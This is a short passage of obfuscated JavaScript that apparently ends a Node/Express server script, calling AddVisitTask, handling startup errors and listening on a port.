AddVisitTask();}catch(_0x2a2ab9){console[_0x298bb8(0x186)]('Error\x20in\x20startserver:',_0x2a2ab9);}}startserver()[_0x366dbb(0x1cd)](_0x583f39=>{const _0x663676=_0x366dbb;console['error'](_0x663676(0x19e),_0x583f39);}),app[_0x366dbb(0x166)](PORT,()=>console[_0x366dbb(0x193)](_0x366dbb(0x1a6)+PORT+'!'));
